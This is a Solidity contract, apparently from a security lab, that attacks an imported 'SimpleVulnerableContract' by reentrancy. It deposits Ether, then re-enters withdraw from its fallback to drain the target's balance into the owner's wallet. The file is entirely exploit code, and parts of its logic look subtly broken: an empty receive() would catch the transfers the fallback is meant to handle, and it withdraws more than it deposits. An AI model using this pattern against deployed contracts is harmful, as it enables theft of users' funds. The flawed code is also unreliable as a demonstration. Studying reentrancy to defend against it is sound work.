// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleVulnerableContract.sol";

contract SimpleAttacker {
    SimpleVulnerableContract public vulnerable;
    address public owner;

    event AttackInitiated(uint256 vulnerableBalance, uint256 attackerBalance);

    constructor(address payable _vulnerableContract) {
        vulnerable = SimpleVulnerableContract(_vulnerableContract);
        owner = msg.sender;
    }

    // Fallback function is called when Ether is sent to the contract
    fallback() external payable {
        if (address(vulnerable).balance >= 1 gwei) {
            vulnerable.withdraw(1 gwei);  // Reenter and drain more Ether
        }
    }

    // Attack function to start the reentrancy attack
    function attack() public payable {
        require(msg.value >= 1 gwei, "Must send at least 1 gwei");

        // Deposit Ether into the vulnerable contract
        vulnerable.deposit{value: msg.value}();

        // Start the first withdrawal to trigger reentrancy
        vulnerable.withdraw(10 gwei);
    }

    // Withdraw funds to the attacker's wallet
    function withdraw() public {
        require(msg.sender == owner, "Only the owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
